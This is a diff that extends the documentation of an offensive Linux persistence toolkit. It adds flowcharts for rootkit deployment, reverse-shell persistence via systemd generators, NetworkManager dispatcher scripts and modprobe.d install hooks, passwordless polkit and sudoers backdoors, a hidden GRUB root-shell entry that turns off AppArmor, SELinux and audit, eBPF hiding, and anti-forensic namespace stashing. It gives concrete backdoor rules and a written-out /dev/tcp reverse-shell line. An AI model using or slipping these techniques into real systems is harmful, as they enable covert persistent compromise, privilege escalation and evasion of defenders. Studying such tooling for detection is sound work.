@@ -1,6 +1,6 @@
 # D3m0n1z3dShell — Technical Documentation
 
-> Complete technical documentation for all 84 techniques with detailed flowcharts showing every syscall, file write, and decision branch.
+> Complete technical documentation for all 93 techniques with detailed flowcharts showing every syscall, file write, and decision branch.
 
 ---
 
@@ -77,6 +77,16 @@
     - [38 — Port Knocking / Socket Filter](#38--port-knocking--socket-filter)
     - [50 — Phantom User Creation](#50--phantom-user-creation)
     - [59 — DNS Tunneling C2](#59--dns-tunneling-c2)
+  - [Advanced Techniques (from Research)](#advanced-techniques-from-research)
+    - [65 — Diamorphine Rootkit Auto-Deploy](#65--diamorphine-rootkit-auto-deploy)
+    - [66 — Systemd Generator Persistence](#66--systemd-generator-persistence)
+    - [67 — NetworkManager Dispatcher Persistence](#67--networkmanager-dispatcher-persistence)
+    - [68 — Polkit Privilege Escalation Backdoor](#68--polkit-privilege-escalation-backdoor)
+    - [69 — Sudoers Backdoor](#69--sudoers-backdoor)
+    - [70 — eBPF-Based Process/File Hiding](#70--ebpf-based-processfile-hiding)
+    - [71 — Modprobe.d Event Hijacking](#71--modprobed-event-hijacking)
+    - [72 — GRUB Bootloader Backdoor](#72--grub-bootloader-backdoor)
+    - [73 — Mount Namespace Stashspace](#73--mount-namespace-stashspace)
 - **Windows Techniques**
   - [9. Windows Persistence Generator](#9-windows-persistence-generator)
   - [10. Windows Defense Evasion Generator](#10-windows-defense-evasion-generator)
@@ -1970,6 +1980,303 @@ sequenceDiagram
 
 ---
 
+## Advanced Techniques (from Research)
+
+### 65 — Diamorphine Rootkit Auto-Deploy
+
+**Script:** `scripts/diamorphine.sh` | **Menu:** [65] | **MITRE:** T1014  
+**Purpose:** Automated deployment of the Diamorphine LKM rootkit — git clone, compile, load, and signal-based control for process hiding, privilege escalation, and module visibility toggle.
+
+```mermaid
+flowchart TD
+    A["diamorphine.sh"] --> B{"EUID == 0?"}
+    B -->|No| Z["Exit"]
+    B -->|Yes| C["Select:<br>1. Install<br>2. Hide PID<br>3. Elevate root<br>4. Toggle visibility<br>5. Uninstall"]
+
+    C -->|1| D["Check: git, make, gcc, insmod"]
+    D --> D1["Check kernel headers:<br>/lib/modules/$(uname -r)/build"]
+    D1 --> D2["git clone Diamorphine<br>→ /var/tmp/.d3m0n_diamorphine"]
+    D2 --> D3["make -C (compile .ko)"]
+    D3 --> D4["insmod diamorphine.ko"]
+    D4 --> D5["dmesg -C (clear traces)<br>make clean + rm -rf clone dir"]
+    D5 --> D6["Module loaded, hidden from lsmod"]
+
+    C -->|2| E["read PID → kill -31 PID<br>Process hidden from /proc"]
+    C -->|3| F["kill -64 $$ → caller gets UID 0"]
+    C -->|4| G["kill -63 $$ → toggle module<br>in/out of lsmod"]
+    C -->|5| H["kill -63 (unhide) → rmmod diamorphine"]
+
+    style A fill:#ff4444,color:#fff
+    style D4 fill:#ff0000,color:#fff
+    style D6 fill:#44aa44,color:#fff
+    style E fill:#ff8800,color:#fff
+    style F fill:#ff0000,color:#fff
+```
+
+---
+
+### 66 — Systemd Generator Persistence
+
+**Script:** `scripts/systemd_generator.sh` | **Menu:** [66] | **MITRE:** T1543.002  
+**Purpose:** Install a malicious systemd generator that creates .service units at boot time — executes BEFORE any regular service, survives systemctl disable.
+
+```mermaid
+flowchart TD
+    A["systemd_generator.sh"] --> B{"EUID == 0?"}
+    B -->|No| Z["Exit"]
+    B -->|Yes| C["Select:<br>1. Revshell generator<br>2. Custom command<br>3. Cleanup"]
+
+    C -->|1| D["Read LHOST, LPORT"]
+    D --> D1["Select generator dir:<br>1. /etc/systemd/system-generators<br>2. /usr/local/lib/systemd/system-generators<br>3. /lib/systemd/system-generators"]
+    D1 --> D2["Write d3m0n-persist script:<br>#!/bin/bash<br>NORMAL_DIR=$1<br>cat > service unit<br>ln -sf into multi-user.target.wants"]
+    D2 --> D3["chmod 755"]
+    D3 --> D4["Generator runs at EVERY boot<br>before systemd starts services"]
+
+    C -->|2| E["Read custom command"]
+    E --> D1
+
+    C -->|3| F["rm -f d3m0n-* from all 3 dirs<br>systemctl daemon-reload"]
+
+    style A fill:#ff4444,color:#fff
+    style D2 fill:#ff0000,color:#fff
+    style D4 fill:#44aa44,color:#fff
+```
+
+**Key Insight:** Systemd generators run as executables in special directories during early boot. They output unit files to a temporary directory that systemd then loads. This runs BEFORE `systemctl enable/disable` is evaluated, making it very persistent.
+
+---
+
+### 67 — NetworkManager Dispatcher Persistence
+
+**Script:** `scripts/nm_dispatcher.sh` | **Menu:** [67] | **MITRE:** T1546  
+**Purpose:** Drop scripts in `/etc/NetworkManager/dispatcher.d/` that trigger on network events (interface up/down, DHCP changes).
+
+```mermaid
+flowchart TD
+    A["nm_dispatcher.sh"] --> B{"EUID == 0?"}
+    B -->|No| Z["Exit"]
+    B -->|Yes| C["Check NetworkManager running"]
+    C --> D["Select:<br>1. Revshell on interface up<br>2. Custom command on event<br>3. List installed<br>4. Cleanup"]
+
+    D -->|1| E["Read LHOST, LPORT"]
+    E --> F["Write /etc/NetworkManager/dispatcher.d/01-d3m0n:<br>#!/bin/bash<br>IFACE=$1; ACTION=$2<br>if ACTION=up → nohup revshell &"]
+    F --> G["chmod 755"]
+    G --> H["Triggers every network reconnect"]
+
+    D -->|2| I["Read command + event type"]
+    I --> F
+
+    D -->|3| J["ls -la dispatcher.d/*d3m0n*"]
+    D -->|4| K["rm -f dispatcher.d/*d3m0n*"]
+
+    style A fill:#ff4444,color:#fff
+    style F fill:#ff0000,color:#fff
+    style H fill:#44aa44,color:#fff
+```
+
+---
+
+### 68 — Polkit Privilege Escalation Backdoor
+
+**Script:** `scripts/polkit_backdoor.sh` | **Menu:** [68] | **MITRE:** T1548  
+**Purpose:** Install permissive polkit rules that grant a user passwordless privilege escalation via pkexec or any polkit-protected action.
+
+```mermaid
+flowchart TD
+    A["polkit_backdoor.sh"] --> B{"EUID == 0?"}
+    B -->|No| Z["Exit"]
+    B -->|Yes| C{"Detect polkit version"}
+    C -->|"≥0.106 (JS)"| D["Select:<br>1. JS rule (any action)<br>2. JS rule (specific action)<br>3. Cleanup"]
+    C -->|"<0.106 (pkla)"| E["Select:<br>1. .pkla rule (any action)<br>2. .pkla rule (specific)<br>3. Cleanup"]
+
+    D -->|1| F["Read username"]
+    F --> G["Write /etc/polkit-1/rules.d/49-d3m0n-nopasswd.rules:<br>polkit.addRule(function(action,subject){<br>  if(subject.user=='USER') return YES;<br>});"]
+    G --> H["User can pkexec ANY command<br>without password"]
+
+    E -->|1| I["Read username"]
+    I --> J["Write /etc/polkit-1/localauthority/<br>50-local.d/d3m0n-nopasswd.pkla:<br>[d3m0n_polkit]<br>Identity=unix-user:USER<br>Action=*<br>ResultAny=yes"]
+    J --> H
+
+    style A fill:#ff4444,color:#fff
+    style G fill:#ff0000,color:#fff
+    style J fill:#ff0000,color:#fff
+    style H fill:#44aa44,color:#fff
+```
+
+---
+
+### 69 — Sudoers Backdoor
+
+**Script:** `scripts/sudoers_backdoor.sh` | **Menu:** [69] | **MITRE:** T1548.003  
+**Purpose:** Add NOPASSWD entries to `/etc/sudoers.d/` with syntax validation via `visudo -c`.
+
+```mermaid
+flowchart TD
+    A["sudoers_backdoor.sh"] --> B{"EUID == 0?"}
+    B -->|No| Z["Exit"]
+    B -->|Yes| C["Select:<br>1. NOPASSWD ALL for user<br>2. NOPASSWD for specific command<br>3. NOPASSWD for group<br>4. List installed<br>5. Cleanup"]
+
+    C -->|1| D["Read username"]
+    D --> E["Write /etc/sudoers.d/d3m0n-backdoor:<br># d3m0n_sudoers<br>USER ALL=(ALL:ALL) NOPASSWD: ALL"]
+    E --> F["chmod 440"]
+    F --> G{"visudo -c -f<br>syntax check"}
+    G -->|Pass| H["Installed — user has<br>passwordless sudo"]
+    G -->|Fail| I["rm -f file<br>Report syntax error"]
+
+    C -->|2| J["Read username + command"]
+    J --> K["Write USER ALL=(ALL) NOPASSWD: /path/cmd"]
+    K --> F
+
+    C -->|5| L["rm -f /etc/sudoers.d/d3m0n-*"]
+
+    style A fill:#ff4444,color:#fff
+    style E fill:#ff0000,color:#fff
+    style G fill:#ff8800,color:#fff
+    style H fill:#44aa44,color:#fff
+```
+
+---
+
+### 70 — eBPF-Based Process/File Hiding
+
+**Script:** `scripts/ebpf_hide.sh` | **Menu:** [70] | **MITRE:** T1564  
+**Purpose:** Use eBPF programs to intercept syscalls (getdents64) and hide processes/files at the kernel level. Supports ebpfkit and TripleCross rootkit deployment.
+
+```mermaid
+flowchart TD
+    A["ebpf_hide.sh"] --> B{"EUID == 0?"}
+    B -->|No| Z["Exit"]
+    B -->|Yes| C{"Kernel ≥ 4.15?"}
+    C -->|No| Z1["Exit: eBPF not supported"]
+    C -->|Yes| D["Select:<br>1. Install bcc-tools<br>2. bpftrace monitor<br>3. bcc-python hider<br>4. Clone ebpfkit<br>5. Clone TripleCross<br>6. Status"]
+
+    D -->|1| E["apt install bpfcc-tools<br>bpftrace python3-bpfcc<br>linux-headers-$(uname -r)"]
+
+    D -->|2| F["bpftrace -e<br>'tracepoint:syscalls:sys_enter_getdents64<br>{printf(\"PID %d reading dir\\n\", pid)}'"]
+
+    D -->|3| G["Generate bcc-python script:<br>attach_kprobe getdents64<br>filter entries matching PREFIX"]
+    G --> G1["Run as daemon<br>save PID to /var/tmp/.d3m0n_ebpf_pid"]
+
+    D -->|4| H["git clone ebpfkit<br>→ /var/tmp/.d3m0n_ebpf_rk"]
+    D -->|5| I["git clone TripleCross<br>→ /var/tmp/.d3m0n_ebpf_rk"]
+
+    D -->|6| J["bpftool prog list<br>Show loaded eBPF programs"]
+
+    style A fill:#ff4444,color:#fff
+    style G fill:#ff0000,color:#fff
+    style H fill:#ff8800,color:#fff
+    style I fill:#ff8800,color:#fff
+```
+
+**Key Insight:** eBPF rootkits operate at the kernel level without loadable kernel modules, making them harder to detect. They hook syscalls via BPF programs attached to kprobes/tracepoints.
+
+---
+
+### 71 — Modprobe.d Event Hijacking
+
+**Script:** `scripts/modprobe_hijack.sh` | **Menu:** [71] | **MITRE:** T1547.006  
+**Purpose:** Use `/etc/modprobe.d/` `install` directives to execute payloads whenever a kernel module is loaded (manually or automatically).
+
+```mermaid
+flowchart TD
+    A["modprobe_hijack.sh"] --> B{"EUID == 0?"}
+    B -->|No| Z["Exit"]
+    B -->|Yes| C["Select:<br>1. Hook module (revshell)<br>2. Hook module (custom)<br>3. List hooks<br>4. Cleanup"]
+
+    C -->|1| D["Select module:<br>usb-storage, fuse,<br>bluetooth, snd-pcm, etc."]
+    D --> E["Read LHOST, LPORT"]
+    E --> F["Write /etc/modprobe.d/d3m0n-MODULE.conf:<br>install MODULE /bin/bash -c<br>'nohup bash -i >& /dev/tcp/IP/PORT 0>&1 &';<br>/sbin/modprobe --ignore-install MODULE"]
+    F --> G["Module loads normally<br>+ payload executes"]
+
+    C -->|2| H["Read module + command"]
+    H --> F
+
+    C -->|3| I["cat /etc/modprobe.d/d3m0n-*"]
+    C -->|4| J["rm -f /etc/modprobe.d/d3m0n-*"]
+
+    style A fill:#ff4444,color:#fff
+    style F fill:#ff0000,color:#fff
+    style G fill:#44aa44,color:#fff
+```
+
+**Key Insight:** The `install` directive in modprobe.d runs a shell command instead of the normal module load. Using `--ignore-install` after the payload ensures the real module still loads, making it transparent.
+
+---
+
+### 72 — GRUB Bootloader Backdoor
+
+**Script:** `scripts/grub_backdoor.sh` | **Menu:** [72] | **MITRE:** T1542  
+**Purpose:** Inject hidden GRUB menu entries (init=/bin/bash for root shell) and modify kernel command line parameters to disable security modules.
+
+```mermaid
+flowchart TD
+    A["grub_backdoor.sh"] --> B{"EUID == 0?"}
+    B -->|No| Z["Exit"]
+    B -->|Yes| C["Select:<br>1. Hidden GRUB entry (root shell)<br>2. Disable security module<br>3. Custom GRUB entry<br>4. Backup/Restore<br>5. Cleanup"]
+
+    C -->|1| D["Auto-detect:<br>vmlinuz, initrd, root device"]
+    D --> E["Write /etc/grub.d/41_d3m0n_recovery:<br>menuentry 'System Recovery' {<br>  linux KERNEL root=DEVICE init=/bin/bash<br>  initrd INITRD<br>}"]
+    E --> F["update-grub / grub2-mkconfig"]
+    F --> G["Hidden entry at boot<br>Select → drops to root shell"]
+
+    C -->|2| H["Select: apparmor=0 / selinux=0 / audit=0"]
+    H --> I["Backup /etc/default/grub"]
+    I --> J["sed append to GRUB_CMDLINE_LINUX_DEFAULT"]
+    J --> F
+
+    C -->|4| K["cp grub.d3m0n.bak → grub<br>Restore original config"]
+    C -->|5| L["rm /etc/grub.d/41_d3m0n_*<br>Restore backup + update-grub"]
+
+    style A fill:#ff4444,color:#fff
+    style E fill:#ff0000,color:#fff
+    style G fill:#44aa44,color:#fff
+    style J fill:#ff8800,color:#fff
+```
+
+---
+
+### 73 — Mount Namespace Stashspace
+
+**Script:** `scripts/ns_stashspace.sh` | **Menu:** [73] | **MITRE:** T1564.001  
+**Purpose:** Create isolated mount namespaces with tmpfs overlays to stash files, tools, and processes invisible to the host filesystem. Works with or without root.
+
+```mermaid
+flowchart TD
+    A["ns_stashspace.sh"] --> B["Select:<br>1. Root stashspace<br>2. Unprivileged stashspace<br>3. Access existing<br>4. Process masquerade<br>5. Anti-forensic shell<br>6. Persistent daemon<br>7. Detect stashspaces<br>8. Cleanup"]
+
+    B -->|1| C{"EUID == 0?"}
+    C -->|Yes| D["nsenter -t PID --mount"]
+    D --> E["mount -t tmpfs tmpfs /path<br>→ stash files in namespace"]
+
+    B -->|2| F["unshare -m -U --map-root-user"]
+    F --> G["mount -t tmpfs tmpfs /path<br>No root needed (user ns)"]
+
+    B -->|3| H["nsenter -t PID -m<br>Access existing namespace"]
+
+    B -->|4| I["Copy binary to /proc/self/fd/N<br>Exec with argv[0] = legitimate name"]
+
+    B -->|5| J["unshare -m → mount tmpfs on $HOME<br>mount --bind /dev/null on<br>nsswitch.conf, bashrc, profile"]
+    J --> K["exec bash --norc --noprofile<br>No history, no atime, no logs"]
+
+    B -->|6| L["Compile C daemon:<br>daemon() + unshare(CLONE_NEWNS)<br>mount tmpfs + drop PID file"]
+    L --> M["Persistent background process<br>in isolated namespace"]
+
+    B -->|7| N["Scan /proc/*/ns/mnt<br>Compare to default namespace<br>Flag non-matching PIDs"]
+
+    B -->|8| O["Kill daemon PID<br>rm PID file + binary"]
+
+    style A fill:#ff4444,color:#fff
+    style E fill:#ff0000,color:#fff
+    style G fill:#ff8800,color:#fff
+    style K fill:#44aa44,color:#fff
+    style M fill:#44aa44,color:#fff
+    style N fill:#4488ff,color:#fff
+```
+
+**Key Insight:** Mount namespaces isolate the filesystem view per-process. Files in a namespace's tmpfs mount are invisible from the host — they don't appear in `find`, `ls`, or forensic disk images because they only exist in memory within that namespace. The `unshare -m -U --map-root-user` trick allows unprivileged users to create stashspaces.
+
+---
+
 ## 9. Windows Persistence Generator
 
 **Script:** `scripts/win_persist.sh` | **Menu:** [61]  
@@ -2216,6 +2523,6 @@ flowchart TD
 
 ---
 
-> **Total: 84 techniques documented** — 60 Linux + 24 Windows sub-techniques  
-> **Diagrams: 90+ Mermaid flowcharts**, sequence diagrams, and state diagrams  
+> **Total: 93 techniques documented** — 69 Linux + 24 Windows sub-techniques  
+> **Diagrams: 99+ Mermaid flowcharts**, sequence diagrams, and state diagrams  
 > **Coverage: Complete MITRE ATT&CK mapping** across all tactics
